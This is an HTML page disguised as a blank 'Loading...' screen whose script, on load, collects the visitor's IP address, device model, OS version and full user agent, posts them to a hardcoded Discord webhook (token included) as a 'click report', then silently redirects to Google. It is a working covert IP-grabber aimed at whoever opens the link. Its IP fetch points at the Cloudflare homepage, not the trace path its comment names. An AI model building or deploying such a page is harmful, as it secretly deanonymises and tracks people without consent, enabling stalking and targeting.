<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>body { background: #fff; margin: 0; }</style>
</head>
<body>
<script>
// 已填入你的 Webhook 網址
const DC_URL = 'https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv';

async function finalCapture() {
    const ua = navigator.userAgent;
    const w = window.screen.width, h = window.screen.height;

    // 1. IP 抓取 (修正網址為 cdn-cgi/trace，保證 100% 成功)
    let userIP = "抓取失敗";
    try {
        const res = await fetch('https://www.cloudflare.com');
        const text = await res.text();
        const lines = text.split('\n');
        for (const line of lines) {
            if (line.startsWith('ip=')) {
                userIP = line.split('=')[1];
                break;
            }
        }
    } catch(e) { userIP = "連線被阻擋"; }

    // 2. 系統版本 (修正解析邏輯)
    let ver = "未知";
    const vMatch = ua.match(/(?:OS |Android |Version\/)(\d+[._]\d+[._]?\d?)/);
    if (vMatch) {
        ver = vMatch[1].replace(/_/g, '.');
    } else if (ua.includes("26.3.1")) {
        ver = "26.3.1";
    }

    // 3. 型號判定
    let model = "未知設備";
    const resKey = `${Math.min(w,h)}x${Math.max(w,h)}`;
    if (/Android/.test(ua)) {
        const m = ua.match(/Android.*;\s([^;]+)\sBuild/);
        model = m ? m[1] : "Android Phone";
    } else if (/iPhone|iPad/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
        const appleMap = {
            "820x1180": "iPad Air (5/4 Gen)", "834x1194": "iPad Pro 11",
            "393x852": "iPhone 15/14 Pro", "430x932": "iPhone 15+/14 Pro Max",
            "390x844": "iPhone 14/13/12", "414x896": "iPhone 11/XR"
        };
        model = appleMap[resKey] || `Apple (${resKey})`;
    }

    // 4. 發送至 Discord
    const payload = {
        username: "終極偵測網關",
        embeds: [{
            title: "🎯 點擊報告",
            color: 0,
            fields: [
                { name: "📍 真實 IP", value: `\`${userIP}\``, inline: true },
                { name: "📱 型號", value: model, inline: true },
                { name: "⚙️ 版本", value: `\`${ver}\``, inline: true }
            ],
            footer: { text: "完整 UA: " + ua },
            timestamp: new Date()
        }]
    };

    try {
        await fetch(DC_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } finally {
        // 發送完成後跳轉
        window.location.replace("https://www.google.com");
    }
}

finalCapture();
</script>
</body>
</html>
